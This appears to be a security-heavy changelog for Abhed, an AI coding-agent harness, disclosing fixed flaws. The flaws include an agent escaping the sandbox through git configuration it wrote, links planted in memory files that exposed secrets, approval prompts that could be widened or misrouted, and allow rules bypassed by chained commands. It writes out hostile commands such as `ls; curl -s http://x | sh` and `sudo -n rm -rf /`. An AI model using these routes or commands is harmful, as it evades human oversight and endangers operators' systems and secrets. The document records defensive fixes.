  and `git commit --amend` are not caught, and the sandbox stays the
  boundary. `mv`, `cp`, `uniq` and `tree`, which can move a folder out of the
  workspace or write over a file, no longer get a scope.
- "Always allow" on a prompt raised by an ask rule turned that rule off for
  the rest of the session, on the CLI, over ACP and in the console, the
  console's `web_search` rule included. An ask rule now offers no scope, and
  no remembered scope satisfies any call but one that asks by default.
- Removing administrator rights through `POST /v1/admin/users/admin` left
  the person's live session with them until it expired: it could grant
  itself the rights back, reset passwords, add MCP servers and mint invites.
  Removing them now ends that person's sessions, and every local session
  re-reads its account when it may have changed, so any group change applies
  on the next request rather than at the next sign-in.
- An account removed with `abhed user remove` while the server ran kept its
  live sessions, an administrator's included, until they expired. The server
  now signs a session out on its next request once its account is gone. A
  terminal or event stream already open is checked only when it opens, so it
  runs on until it closes.
- `GET /logout` ended the session, so any page could sign a person out with
  an image or a link. Signing out is now a POST behind the same-origin check.
- On a multi-node deployment, an approval pending on another node could be
  answered by anyone signed in who held the session id; it is now answered
  only by the session's owner, as on the node that runs it.
- Keys typed while the interactive approval prompt was showing answered it:
  "Wait, stop", typed as the prompt appeared, approved a write with its `a`,
  and Enter on its own accepted. Now only one of the prompt's keys pressed
  on its own answers it: on an empty line, with at least 300 ms of quiet
  after the choices are drawn and after the previous key, and 300 ms after
  the key itself (600 ms for `A`, which allows for the whole session), so a
  sentence that starts with one ("Actually no") or a held-down key does not
  answer. A key followed at once by Enter shows the choices again, and Enter
  alone never accepts. Other typing is kept on the line and sent as a
  steering message on Enter, and the prompt says so.
- Project memory (`ABHED.md`, `ABHED.local.md`) was read with no check, so
  a link the agent planted there put `.abhed/users.json`, the secrets file or
  a file outside the workspace into the system prompt, and `/memory` printed
  it. Workspace memory files are now read as the file tools read; the
  operator's files in `~/.abhed` and `/etc/abhed` are read only when they
  are not links.
- The git commands Abhed runs itself on the host (the branch and change
  count in every prompt, worktrees for parallel runs, and a resolved issue's
  commit, diff and push) ran whatever the repository's own configuration
  named: an fsmonitor, hooks, clean and smudge filters, textconv and
  external diffs, a signing program, a credential helper or a transport. The
  agent can write that configuration, so it ran with the server's privileges
  outside the sandbox. The settings known to do so are now switched off in
  git's command-line scope, submodules are not entered, a change holding a
  repository of its own is not committed, and git's own environment
  variables are dropped. The list is best effort; this git does not yet
  run inside the sandbox.
- `abhed resolve` pushed with the forge token to whatever the named remote
  pointed at, which the run could change, sending the token to another host.
  It now pushes to an https address built from the issue, from a temporary
  repository with no configuration of its own, so the repository's
  configuration (TLS checks, proxies, address rewrites, transports allowed
  by name) no longer decides where the token goes; only the operator's
  global configuration applies.
- The line that keeps parallel-run worktrees out of `git status` was
  appended to `.git/info/exclude` through any link there, so a link to
  `.abhed/users.json` corrupted it. It is now written as the file tools
  write, and not at all when the git directory is outside the workspace.
- "Approve once" could become "always allow". A node reading an answer from
  the store, because it landed on another node or the turn read the row
  first, remembered the request's scope whatever the reviewer chose. The
  approval row now keeps the scope the answer carried (`answer_scope`), and
  only an answer that chose "always allow" widens the session.
- An approval row stayed open after its request ended unanswered
  (interrupted, shut down, timed out or its turn failed), including one
  written after the turn gave up waiting for it. After a restart, an answer
  with no `request_id` then marked it approved with `204` though nothing
  was waiting, and the record showed an approval no one acted on. A request
  now closes its row when it ends (`ended_at`), a closed row takes no
  answer, and an unbound answer on a node not running the session is
  recorded only when another node is running it.
- `abhed rpc`, `abhed acp` and `abhed resolve` ignored the workspace's
  `sandbox` configuration: `bash` ran on the host with the operator's whole
  environment, the model's API key variable included, and could write outside
  the workspace. They now run it in the configured tier, as the terminal does,
  and refuse to start a session when no backend meets `sandbox.min_tier`. The
  SDK gains `Options.Sandbox` to ask for the same; without it, and without a
  managed `sandbox` setting, an embedded agent still builds no sandbox.
- A command run without a sandbox (the `none` tier, and the unsandboxed
  fallback of the bash tool and the workbench terminal) no longer inherits
  the server's exported bash functions (`BASH_FUNC_*`), `SHELLOPTS` or
  `BASHOPTS`, alongside `BASH_ENV` and `CDPATH`. An exported `cd` or `pwd`
  function ran in place of the builtin, and `SHELLOPTS` changed how every
  line was run.
- Abhed's own state (`.abhed/`, and a users or secrets file configured
  elsewhere) could be reached under another name. On a case-insensitive disk,
  the macOS default, `.ABHED/users.json` and `.Abhed/config.json` open the
  files in `.abhed/`; a file or folder symlink in the workspace pointing into
  it did the same, even one whose target did not exist yet. Through these the
  agent's read, write, edit and a followed `cd` reached it, and so did the
  server's `download`, `file`, `tree` and `search` endpoints, which returned
  the password hashes in `users.json`. Every one of them, and the rest of the
  workbench's path endpoints, now uses one check: names compare without case,
  both the path as given and the path with every link followed are judged,
  and the filesystem is asked whether the path or a folder above it is a
  state directory or a state file. A link swapped in between that check and
  the open is caught too: files are opened under the workspace root held
  open, each folder is judged by identity once opened, and what was opened
  is judged again (see the entry on leaving the workspace below). An upload
  is refused when its folder leads out of the workspace or into the state.
  A hardlink is recognised for the users, config and secrets files, and for
  up to 4,096 other files and folders in the state directories.
- A users file set with `auth.users_file`, or a secrets file set with
  `ABHED_SECRETS_FILE`, could sit where sandboxed commands write, such as a
  folder in the workspace or a temp folder, and be read or replaced. Abhed
  now refuses to start when one does, unless it is under the workspace's or
  the home directory's `.abhed/`; a path that does not exist yet is judged
  by its deepest existing folder, with links followed.
- `glob`, `grep` and the code index followed file symlinks with no check, so
  a link in the workspace to `~/.ssh/id_rsa` or into `.abhed/` was searched
  and printed. `grep` and the index no longer read through links, and none of
  them read a file that is a state file under another name (a hardlink, as
  bounded above) or descend into `.abhed/`; `glob` lists a link only when a
  read of it would be allowed. A write through a link whose target does not
  exist yet is judged by where the target would be.
- `read`, `write`, `edit` and `/undo` could leave the workspace through a
  folder swapped for a link after the path was checked, which a background
  command can do: a read returned a file outside, a write or an undone edit
  replaced one, and an undone creation removed one, including
  `.abhed/users.json`. Files are now opened, written, removed and
  snapshotted under the workspace root held open as an `os.Root`, following
  links only while they stay inside it; the same holds for `/diff`, the
  server's download, viewer, save and upload, and the code index. A link
  into a directory added with `--add-dir` is used in that directory.
- An approval could answer a different request from the one it was shown
  for. `POST /v1/sessions/{id}/approve` named no call, so after Send now a
  click on the interrupted run's prompt approved the new run's call; and an
  answer sent while nothing was pending was held and approved the next
  request unasked. The endpoint now takes an optional `request_id`, the `id`
  of the `action.requested` event being answered (a model's `call_id` is not
  used, because models repeat it across turns):
  - On the node running the session, the reply says what became of the
    answer: 204 the waiting turn took it; 200
    `{"recorded":true,"applied":false}` it was recorded on the store but the
    turn stopped waiting first (it was interrupted or timed out), so nothing
    ran on it; 409 it was refused; 429 too many answers are waiting, retry;
    400 its scope was not the one offered;
    503 the request's row was not written within 30 seconds.
  - An answer naming another request, or one that has ended, is refused
    with 409 "that approval is no longer pending", and is neither taken nor
    recorded. An answer that arrives with an interrupt is refused the same
    way, or reported as recorded but not applied if it reached the store,
    unless the turn took it first.
  - An answer with nothing pending is refused with 409 "no approval is
    pending for this session" and is no longer held. An answer naming a
    request not yet published waits up to two seconds for the turn to
    publish it, then gets that 409. Once published, it waits up to 30 seconds
    more for the request's row to be written, then gets 503. At most eight
    answers wait per session; more get 429 "too many answers are waiting
    for this session" with `Retry-After`, and the workbench and console keep
    the prompt and say "Busy, try again".
  - An answer's `scope` ("always allow") must be empty or the scope the
    request offered; any other is refused with 400, so a client cannot
    widen what is remembered for the session.
  - Two answers at once, with or without a store: one is taken and the other
    refused with 409, so a Deny is never acknowledged while the turn runs the
    Allow. The refusal says "this approval was already answered", or "that
    approval is no longer pending" when it arrives after the turn has moved
    on; which one depends on timing, and a client should treat both alike.
    With a store, the answer is recorded on that request's own row, not the
    session's newest, and the first recorded decides.
  - On a node that is not running the session, an answer naming a request is
    not recorded, since the stored row cannot be checked against it; the
    reply is the usual 421 with `Abhed-Session-Node`, so it can be sent to
    the node that is, or 404 when routing is off. A later release will store
    the request id on the approval row, so any node can check it.
  - An answer without `request_id` still answers the pending request, as
    before, on any node; on another node its 204 means it was recorded on
    the store for the running node to read. Clients should send
    `request_id`, as the workbench and the console now do.

  The workbench and the console also settle a prompt the server refuses an
  answer for (409, or 421 with a note that it must be answered on the server
  running the session), and the workbench settles a run's open prompts when
  the run ends, so they can no longer be clicked.
- A `bash` allow rule no longer approves a chained command. With
  `bash(ls*)`, `ls; curl -s http://x | sh`, `ls && python3 -c ...`,
  `ls$(touch pwn)` and `ls > important.txt` were approved without asking. An
  allow rule now approves only a command with none of `;`, `&`, `|`, a
  newline, `$(`, `${`, a backtick, `<`, `>`, `(` or `)`, even inside quotes;
  any other command falls through to a prompt. `bash`, `bash(*)` and `*`
  still allow every command. An allow rule such as `bash(cd x && go test*)`
  therefore no longer matches anything, and loading a configuration with one,
  or adding one through the SDK's `Options.Allow`, writes a warning naming it.
- A chained command is offered no "always allow" scope. A remembered scope is
  looked up by name, so after "always allow `bash(git status *)`",
  `git status && curl x | sh` was approved without asking.
- `bash` deny and ask rules match each command in a chain as well as the whole
  line, including commands inside `$(...)`, backticks and subshells:
  `bash(rm -rf /*)` now denies `ls; rm -rf /`. Each command is also matched
  past leading `VAR=value` assignments, redirections and the wrappers `env`,
  `command`, `exec`, `nohup`, `nice`, `builtin`, `sudo`, `doas`, `coproc`,
  `time`, `timeout` (and its duration), `xargs`, `setsid`, `stdbuf` and
  `ionice` with their options, named bare or by path (`/usr/bin/sudo`), so it
  denies `sudo -n rm -rf /` and `timeout -s KILL 5 rm -rf /`. Whether an
  option takes a value is not known, so both readings are matched; a lone `-`
  (`env -`) is an option. The split does not parse quoting, so it can only
  add a denial or a prompt. Its work is linear in the command's length, and a
  command it cannot split in full (over 64 KiB, over 1,024 parts, or a
  wrapper with more than 16 readings) is asked about in every mode, with the
  new step `screen`, while any `bash` deny or ask rule has a pattern.
- A `*` in any rule now matches newlines. Before, a newline anywhere in the
  subject took it past every deny rule bounded by `*`: `bash(*mkfs*)` did not
  deny `echo` and `mkfs /dev/x` on two lines, nor `read(*secret*)` a path with
  a newline in it. An allow rule with a narrower pattern than `*` still never
  approves a subject with a newline in it.
- Workbench: in the line-by-line terminal (`sandbox.terminal: "lines"`), a
  destructive command, one the policy always confirms, is no longer run on
  Enter. The terminal shows the reason and asks `Run it? [y/N]`; only `y` runs
  it, recorded as `action.approved` with `"confirmed": "true"`, and anything
  else is recorded as the person's declined `action.denied` and drops the
  lines queued behind it. `POST
  /v1/sessions/{id}/pty` answers such a line with `confirm` and runs nothing
  until it is sent again with `"confirmed": true` (or `"declined": true`), so
  a client that sends neither never runs it; `"declined": true` for a line
  that needed no confirmation runs and records nothing. Other lines, the
  Explorer and the interactive terminal are unchanged.

## [1.1.2] - 2026-09-25

### Changed

- The terminal carries the new mark: the startup banner draws the Abhed A,
  and the accent the CLI uses for the prompt, tool calls, headings and inline
  code is the brand orange instead of cyan.
- The HawkEYE report uses the console's ink, paper and orange palette in both
  themes.
- The page shown when sign-in is not configured carries the Abhed lockup.
- On a phone, the console and workbench headers show the mark alone, and
  neither page scrolls sideways: the console drops its "console" label and
  Password link, and the workbench drops its Password, Switch and classic
  console links. On both, the signed-in name links to the account page.

### Fixed

- The documentation embedded in the binary linked web fonts, so a connected
  machine made a request to another host when the docs were opened. It now
  uses the system fonts and loads nothing from outside, whichever way the
  binary was built; a test holds it there.

## [1.1.1] - 2026-09-25

### Changed

- The web console, the sign-in page, the workbench, the account page and the
  embedded documentation carry the new Abhed and Zybuu marks and an ink, paper
  and orange palette, with a dark theme designed alongside the light one. On
  the console, sign-in, workbench and account pages the images are embedded in
  the binary as data URIs, so those pages still load nothing from anywhere; no
  route was added.
- The sign-in page shows the mark in place of the animated network, and it
  keeps still under reduced motion.
- `/favicon.ico` is now a PNG; `/favicon.svg` remains an SVG.
- The lockups and marks in `brand/` are PNG files; the SVGs were removed.

## [1.1.0] - 2026-09-24

### Added

- `hawkeye.AnalyzeWith` and `hawkeye.Options`, for what the caller knows
  beyond the record (`Live`: the session is still running there), and
  `hawkeye.Call.Actor` (`actor` in the JSON report): whether the model or a
  person made the call. `Analyze` is unchanged.
- `config.Config.ManagedKeys`, the settings the managed file set as dotted
  paths, and `Config.ManagedSets` to ask about one; `config.Overrides`,
  `Config.Apply`, which lays a caller's overrides over a configuration so
  they may tighten the managed settings and never loosen them, and
  `config.ManagedError`, the refusal it returns; `config.LoadManaged`, the
  defaults with only the managed file applied.
- A configuration key that nothing reads is reported: it is still ignored, so
  every configuration that loaded before still loads, but each one is written
  to standard error once, with its file, its JSON path and, when a known key
  is close, the one probably meant (`model.provider` → `model.default`).
  `abhed doctor` lists them and fails. Keys starting with `_` or `$`
  (`_comment`, `$schema`) are annotations and never reported; one in the
  managed file says so. `config.Config.Unknown` carries them, and
  `config.UnknownKey.Managed` marks one found in the managed file.
- `GET /account`, where a local-accounts user changes their own password, and
  `switch_url` and `password_url` in `/v1/whoami`, naming the routes this
  deployment has for switching user and changing a password.
- Workbench: a **Search** view across the workspace, with match case, whole
  word and RE2 regular expressions, results grouped by file and opened at the
  line (`GET /v1/sessions/{id}/search`). It reads only what the Explorer shows
  and passes over the folders `grep` does; it stops at 2,000 results, 20,000
  files or five seconds and says which, marks a file cut at 100 matches, and
  runs at most two at once per session.
- Workbench: the Explorer makes new files and folders, renames (F2) and
  deletes, from its toolbar and a right-click menu (`POST
  /v1/sessions/{id}/folder`, `/rename`, `/delete`). Each is recorded as the
  person's own command and held to the bash rules and the sandbox. Every
  path it touches, as named and with links followed, and everything inside a
  folder at its old and new path, must be one the workbench would open and a
  save to which the write rules allow.
- Workbench: save all (⌥⌘S / Ctrl Alt S), close the editor tab (⌘W / Ctrl W
  where the browser passes it on), Ctrl \` for the terminal, ⇧⌘F for search,
  the file's path and the cursor above the editor, a prompt before leaving
  with unsaved edits, and open tabs restored after a reload.
- `web/ide/editor.js` has a documented, empty seam where a language server
  will attach; nothing is registered yet.
- `edit` and `write` parse Go, JSON and Python before writing, where a parser
  is available (see the tools guide for Python's conditions). A change that
  would leave a file that parsed no longer parsing is not applied, and the
  model is told the error and the line; an `edit` whose new text is a pasted
  diff is refused the same way. Workbench saves are warned, never refused.
  HawkEYE reports a refused change as `broken-edit`. `tools.syntax_check`:
  `refuse` (default), `report` or `off`. It comes from sessions in which a
  model wrote diff markers into Python files.
- The `monitor` package and a policy step for it: a judge that reads the
  remit, the agent's reasoning and where a call's arguments came from, and
  may only tighten a decision; unavailable means ask, or deny when headless.
  Verdicts are recorded as `monitor.verdict`. The local-model judge follows.
- Workbench chat: a message shows as soon as it is sent, with a *Thinking…*
  line and seconds count until the reply starts; reasoning streams into a
  live block; replies render as markdown built from text, never markup. A
  message sent while the agent works is queued for the next step with **Send
  now** and **Cancel**, and marked delivered when the agent reads it. Esc
  stops a run only when pressed twice.
- `GET /v1/sessions/{id}/queue` and `DELETE /v1/sessions/{id}/queue/{qid}`
  list and withdraw queued messages. A follow-up to a busy session answers
  with a `queue_id`, and the `user.message` that delivers it carries the same
  id; `"interrupt": true` stops the running turn and sends the message fresh.
  A `client_id` on any post is echoed on its `user.message`. The queue routes
  and `/interrupt` answer `421` with `Abhed-Session-Node` for a session
  running on another node, as `/approve` does.
- `agent.reasoning.delta` events carry reasoning as it streams.
  `agent.reasoning` is unchanged and still follows with the whole text.
- The event stream takes `?after=<seq>` as well as `Last-Event-ID`.
- Hooks for the paid editions, all nil or unset by default so the Community
  Edition behaves as before: `auth.LocalAuth.Admit`, asked after a password
  checks out and before a session is issued; `auth.Middleware.Check`, run
  after any provider, token or proxy identifies someone, which ends a refused
  session and answers 403 with the reason (a browser goes to `/?refused=`),
  and which `/v1/whoami` and `/v1/overview` honour too; and
  `server.Options.AdminAudit`, told of every `/v1/admin/*` change. An MCP
  server's URL is recorded without credentials or query, and its command as
  the program alone.
- `auth.LocalAuth.Sessions` lists live local sessions by a digest of their
  cookie, never the cookie, with when each was created, last seen and
  expires; `EndSession` ends one by that digest. `auth.SessionEnder` lets a
  provider end a request's session without answering it.
- In `proxy` mode `/v1/whoami` reports the identity the proxy supplied, and
  the console and workbench show it. Sign-out appears only when the new
  `auth.proxy_logout_url` names the proxy's own.
- `auth.github.orgs`, `auth.github.teams` and `auth.github.allow_any`, for the
  paid editions' GitHub sign-in. Validated in every edition; the Community
  Edition does not otherwise read them.
- The workbench terminal is a shell: each tab is one interactive `bash` in the
  session's sandbox, at the workspace root, with history, completion, state
  between lines and full-screen programs. Tabs can be added, renamed and
  closed; resize, multi-line paste, Ctrl+C and a Kill button work; a banner
  states the sandbox tier, the workspace and the network, and the `none` tier
  is flagged in red. Opening the shell is a judged, recorded `bash` call;
  each line is screened against the deny rules as typed and recorded as the
  new `terminal.input` event. The docs say plainly that the sandbox is the
  boundary and the line checks are best effort. `sandbox.terminal: "lines"`
  keeps the one-checked-command-per-line terminal, which a managed policy
  also gets when it has deny rules for `bash` or for every tool (`*`), or a
  policy hook such as an extension. A page reload reattaches to its shells; a
  shell nobody watches ends after 30 minutes (`sandbox.terminal_idle_minutes`).
  When a shell ends, everything still running in its process session is
  stopped and killed, pass after pass, including jobs started with `nohup`,
  `disown` or `trap '' HUP`; a process that starts a session of its own
  escapes and runs, within the sandbox, until it ends. If the sweep cannot
  run, the server logs a warning (`the shell's session was not swept`) with
  the session, the terminal and the reason. On the `none` and `process` tiers
  a shell runs as the server's user and shares its process limit, so a fork
  bomb there can exhaust it for the server too.
- A session can be opened without a prompt (`POST /v1/sessions` with
  `"workbench": true`). The workbench opens one, so the terminal works as soon
  as the page loads; the first message goes to it. It records
  `session.started`, is owned and listed like any other, and session lists
  now carry each session's `mode`.

### Changed

- **Upgrade note:** `abhed doctor` now exits non-zero when the configuration
  has a key that nothing reads, in any file, the managed one included. A
  pipeline that ran `abhed doctor` cleanly on 1.0.1 may fail on 1.1.0
  until the key is corrected or removed; the warning names the file and the
  key.
- **Upgrade note:** a managed file (`/etc/abhed/config.json`) behind a
  directory that cannot be searched, or a link there to nothing, now stops
  `abhed` instead of being ignored. The SDK now reads the managed file even
  without `ConfigDir`, so an embedder on a host with one is bound by it.
- An unknown permission mode given to `-mode` or the SDK's
  `Options.Mode` is refused; it ran as `default`.
- The SDK applies the configuration's `permissions.ask` rules, as the CLI and
  server do; it ignored them. This only adds prompts.
- The reason given when a call is put to a person is accurate for the tool:
  "running a command needs approval in default mode" for `bash`, "changing a
  file needs approval …" for `edit` and `write`, where every such call read
  "mutating tool requires approval". What is allowed, asked and denied is
  unchanged; only the `reason` text differs.
- **Security-relevant default:** the workbench terminal no longer judges each
  line before it runs. After an upgrade it is an interactive shell, bounded by
  the sandbox, in which `bash` deny rules only screen each line as typed and
  miss what the shell expands, recalls or runs from a script. To keep a policy
  decision on every line, set `sandbox.terminal: "lines"`; a managed policy
  keeps it without that setting when it has deny rules for `bash` or for
  every tool (`*`), or a policy hook such as an extension. Deny rules still
  hold for every tool call, the agent's and a person's.
- The workbench streams replies with one DOM append per frame, follows the
  conversation only when you are at the bottom of it, reconnects from the last
  event it drew rather than replaying the session, draws a tool call's body
  when it is opened, and keeps the Events panel to its latest 500 rows.
- A message queued while the final turn of a run was answering is now
  answered in the same run; before, it waited for the next prompt. One left
  queued by a run that was stopped is delivered ahead of the next prompt.
- The event stream reads events back from the record when the store dropped
  them for a subscriber that fell behind, so none is lost or repeated.
- A `model.call` cut short by an interrupt no longer records the cancelled
  stream as an error; the session ends as `user_interrupt` as before.
- `/v1/whoami` names `sign_out_url` when there is one, and the console and
  workbench draw Sign out only then.
- The workbench editor is now Monaco (MIT), in place of CodeMirror: its
  default keybindings, multiple cursors, minimap, find and replace, folding,
  bracket matching, go to line and go to symbol, and in-browser language
  services for JSON, CSS, HTML, JavaScript and TypeScript. Review uses its
  diff editor, side by side or inline, with Accept and Reject on each change.
  The components under `/ide/vendor/` are now kept and sent gzipped, about
  3.5 MB (14 MB unpacked, for a client without gzip), half of it the
  TypeScript worker, which loads only for JavaScript and TypeScript; the
  binary grows by about 2.4 MB. The workbench's content security policy adds `font-src 'self'` for the editor's
  icon font; its workers are same-origin files, so no `blob:`, `worker-src` or
  `unsafe-eval` is needed, and each is served with its own
  `default-src 'none'; script-src 'self'`.
- The workbench's terminal and editor reopen a session from its record after
  a restart, where they answered 409; if it cannot be reopened, the page opens
  a fresh workbench session. A clean shutdown records `session.ended` for
  workbench sessions nobody has messaged, so they can be reopened.
- A session continued from its record no longer shows the model the calls a
  person made in the workbench, which the model had never seen while the
  session ran, and `recall` no longer returns their results.
- `GET /v1/capabilities` reports the sandbox tier in force and its mechanism,
  not the configured minimum.
- `SECURITY.md` supports the latest 1.x release; earlier 1.x releases are
  asked to upgrade, and 0.x is no longer supported.
- `abhed-bench`: `cache_reported` in the JSON output now means the endpoint
  sent a cached-token figure, zero included, rather than that some prefix was
  cached. A stack that reports zero on every turn gets the no-caching warning,
  worded as such.
- Sessions from the command line, the server and the Go SDK now refuse an edit
  or write that would break a file's syntax, where they applied it before.
  Set `tools.syntax_check` to `report` or `off` to keep the old behaviour;
  the SDK also takes `Options.SyntaxCheck`.

### Deprecated

- `auth.LocalAuth.Whoami`: nothing registers it; the server answers
  `/v1/whoami` for every provider. It goes in 2.0.

### Removed

- The benchmark (`bench/`, `docs/benchmarks`) is no longer part of this
  repository. The three multi-harness rig runs published so far are
  withdrawn: the rig did not give every harness the same conditions. The
  earlier single-file comparison of 2026-09-14 is no longer published either.
  Both remain in this repository's history. A result published later will
  come with its method and raw records, whatever it shows.

### Fixed

- The classic console's **Workbench** link sat with the signed-in user's
  controls, which the console removes on a server without sign-in, so there
  was no way back to the workbench there. It now sits beside the brand, at
  every width.
- `abhed -h`, and an unknown flag, print a synopsis, every subcommand with
  what it does, an edition's own commands, and then the flags; they printed
  the flags alone. `-addr` read as `-addr abhed serve` and now reads as a flag
  with a value. `app.WithCommand` now also ignores `hawkeye`, `migrate`,
  `resolve`, `acp` and `secret`, which Main always dispatched itself.
- On the macOS process tier with the network off, a command could list the
  host's interfaces, LAN address, gateway and VPN tunnels (`ifconfig`,
  `netstat -rn`, `route -n get`, `scutil --nwi`). The sandbox now denies the
  routing sysctls, routing sockets, and the system configuration and network
  services too, as Linux's network namespace does.
  MAC addresses from the I/O registry and the host name stay visible; the
  security posture says so.
- On the macOS process tier, `pytest` and `ls -R` in the workspace failed
  with "Operation not permitted" on `.abhed`. A command may now stat it and
  what it holds, so they pass it by, as `git add -A` does; it still cannot
  list it or read or write its files. `find .` and `du` still report it and
  exit 1.
- A workbench shell ended by the person, by `exit`, Kill, closing its tab,
  closing the session or going unwatched, is recorded with its exit status and
  not as an error, and the record says how it was closed. Only a shell that
  failed to start is an error. A command ended by a signal, the agent's
  `bash` call or one in the workbench terminal, now records 128 plus the
  signal's number as its `exit_code`, as a shell reports it, where it
  recorded -1.
- HawkEYE no longer attributes a person's workbench calls to the model: calls
  with `actor: user` never raise `repeated-failure`, `slow-tool`, `truncated`
  or `borrowed-host`. `no-end` is not raised for a session still running on
  the server; offline, with a shell still open, it says so.
- The workbench chat shows the conversation with the agent. The person's own
  calls (shells, terminal lines, Explorer operations and saves) no longer
  appear in it; they stay in Events and the record, and saves in Changes.
- An administrator whose account has an email address could remove their own
  administrator rights: the guard compared the username with the email. It now
  compares the account itself, and the last administrator cannot be removed by
  anyone.
- A password set by an administrator now has to be changed before anything
  else: until it is, the session reaches only `/account`, `POST /v1/password`,
  `/v1/whoami`, sign-out and static files. A browser is sent to `/account`; an
  API call gets `403 {"error":"password change required"}`. It had been a note
  in the workbench.
- In `proxy` mode, a request whose proxy names no user no longer carries the
  groups in `X-Abhed-Groups`.
- The workbench is where sign-in lands, and the console links to it; it had
  to be reached by typing `/ide`. Switch no longer leads to a 404 on local
  accounts, Admin appears only where an admin page exists, and a local user
  can change their own password at `/account`, which also ends a password an
  administrator set. The workbench shows who is signed in, pages have an
  icon, and the editor files are revalidated so an upgrade never serves a
  stale copy. The authentication guide says which edition has which sign-in,
  and no longer promises API tokens the Community Edition does not issue.
- On the container tier, a workbench terminal command ran the engine's CLI
  with only `TERM` in its environment, so it had no `PATH`, `HOME` or
  `DOCKER_HOST`. It now inherits the host's environment; only the `-e` flags
  reach the container.
- The Explorer no longer collapses every folder when a command finishes; it
  reloads in place and keeps the folders that were open.
- Interrupting or deleting a session that had been continued from its record,
  and was idle, no longer fails on a missing cancel function.
- HawkEYE's `cold-cache` finding no longer fires when the provider reports no
  cached-token figure at all, as some OpenAI-compatible endpoints do; absence
  had been read as zero. `model.call` events record `cache_reported`; a
  record written before this has none, so `cold-cache` is not raised on it.
  (#74)
- A turn that spends its whole output budget reasoning without a tool call
  is a stall, not an answer: the model is told its reply was cut off, the
  next call asks for low reasoning effort, the turn is marked `cut_off` in
  the record and HawkEYE reports `output-cap`. Sessions ended this way; some
  read as completed because a sentence had come out before the cut.

### Security

- **A secret split across streamed fragments reached the record.** The reply
  is recorded as many `agent.delta` events, and redaction ran on each one, so
  a stored value that arrived in two fragments matched in neither: it
  reached the record and the live stream in pieces. `agent.message` was
  always redacted whole. `agent.reasoning.delta` is redacted the same way. The model holds a value only when a prompt or an
  @-mentioned file carried one, since tool output is redacted before it sees
  it. Streamed text is now held back by about the length of the longest
  stored value, redacted with what follows, and released at the end of the
  turn, on error or on interrupt; with no secrets stored nothing is held
  back. `server.Options.Redact` now takes any type with methods
  `Redact([]byte) []byte` and `Span() int`, the length of the longest text
  it replaces; a nil pointer of such a type means no redaction.
- **A value next to a JSON escape could be left in place.** Values were
  matched against the escaped payload, so one whose bytes also occurred
  across an escape (`\u003e`, `\n`) could break the JSON, and tool output
  was then passed on unredacted. Values are now matched in the decoded text
  of each string, and redaction fails closed: text that cannot be redacted
  becomes `[redacted: output withheld]`, and a payload left invalid is
  replaced whole.
- **An embedded agent could loosen the managed configuration.** The SDK let
  `Options.Mode` replace the managed permission mode, including with
  `bypass`, which the CLI and server refuse under a managed file; it never
  marked its policy engine managed, so the workbench terminal's managed
  line-by-line enforcement and the engine's own `bypass` refusal did not
  apply; without `ConfigDir` it did not read the managed file at all; and
  `Options.SyntaxCheck` could turn a managed syntax check off. The CLI's
  `-mode` flag also replaced a managed mode. Now `config.Load` records which
  keys the managed file set, and the CLI's flags and the SDK's `Options` may
  tighten those settings and never loosen them: `bypass` is refused under a
  managed file; a managed `permissions.mode` admits only itself or `plan`;
  a managed `tools.syntax_check` only something stricter; a managed
  `limits.max_turns` only a lower limit; a managed `permissions.allow` or
  `additional_dirs` no additions. Deny rules from a caller are added to the
  managed ones. A refused override is an error from `abhed` and from
  `sdk.New`, never a silent change. The SDK reads the managed file with or
  without `ConfigDir`, marks its engine managed, and wraps bash in the
  configured sandbox when the managed file sets a `sandbox` key (and fails
  when no backend meets its `min_tier`). The interactive `/mode` command is
  bound as `-mode` is. `abhed eval`, which approves every prompt with nobody
  to ask, refuses to run under a managed file. `abhed resolve` runs in a
  pinned managed mode unless `-mode` says otherwise. A refusal names the
  managed file. A managed file behind a directory that cannot be searched,
  or a link at the managed path to nothing, is an error; both were treated
  as absent, as the SDK treated the file when `ConfigDir` was empty. Keys in
  the managed file
  are matched as the JSON decoder matches them, so one it applies, such as
  a key spelt with `ſ`, is also bound and is not reported as unknown.
  Without a managed file, the only changes are the two under Changed: an
  unknown mode is refused, and the SDK applies `permissions.ask`.

## [1.0.1] - 2026-09-22

### Added

- `auth.users_file` (`ABHED_USERS_FILE`): where local accounts are kept when
  there is no database. A deployment points it outside every workspace.
- `app.WithMigrateExtension`: an edition with tables of its own registers
  their schema and the runtime role's privileges, so one `abhed migrate`
  provisions the whole record under the owner and runtime roles.

## [1.0.0] - 2026-09-22

The first major release. From here the command line, the configuration
schema, the event record and the Go SDK (`sdk`) follow semantic versioning:
a change that would break any of them is a 2.0. The other public Go packages
(`server`, `auth`, `store`, `config`, `app`) are supported extension points
whose shape may still move in a minor release, and say so when it does.

### Added

- **The workbench at `/ide`.** An editor with syntax highlighting beside the
  agent, a file tree, a changes view that opens each file for review with
  accept and reject chunk by chunk, a terminal, and HawkEYE live. Edits and
  terminal commands made by the person go through the same policy, sandbox
  and record as the agent's, marked as theirs. `@path` attaches a file to a
  message; select code and press the focus-agent key to ask about it. The
  editor and terminal components are built into the binary, so nothing loads
  from the network.
- **HawkEYE.** `abhed hawkeye`, `/hawkeye` and `GET /v1/sessions/{id}/hawkeye`
  report what a session did from its record alone: per-turn tokens and
  context, the policy step behind every call, files touched, subagents,
  compactions, and deterministic findings — a call to a host that only tool
  output supplied, a credential path, a gap in the record, a redacted secret.
- **Context that keeps its record.** Old and large tool results leave the
  window for a one-line pointer once it passes `context.offload_at`; the full
  text stays in the record and the new `recall` tool reads it back by id,
  text or offset. Nothing is lost from the record; anything dropped from the
  window can be retrieved.
- **Secrets by name.** `abhed secret set NAME` stores a credential outside
  every workspace. The model sees the name, asks for it on one command, and
  gets it only under a `secret(NAME)` allow rule, in every mode. Every event
  is redacted before it is written and every tool result before the model
  reads it; HawkEYE reports a redaction.
- **`abhed resolve <issue-url>`** turns an issue on GitHub, GitLab or
  Gitea/Forgejo — self-hosted instances and their certificate authorities
  included — into a branch in its own worktree, a commit, a push and a pull
  request. Opening the request is its own policy-judged action, `forge_pr`.
- **`abhed acp`** speaks the Agent Client Protocol over stdio, so Zed,
  JetBrains and other editors run Abhed as their agent; their approval dialog
  answers asks and cannot lift a deny.
- **The benchmark rig** (`bench/rig`): several harnesses on one local model
  over multi-file tasks with a validity gate, self-tests, two context
  conditions and paired bootstrap intervals. Results are published whatever
  they say; the first published run is still owed.
- **Scale.** A session's node is recorded and requests routed to it,
  approvals are answered on any node, a node's claim is refreshed while its
  turn runs, and shutdown drains instead of ending turns in flight.
- **`abhed migrate`** and two database roles: an owner that migrates and a
  runtime role that can only append.

### Changed

- The permission mode no longer decides secrets, and a write or edit that
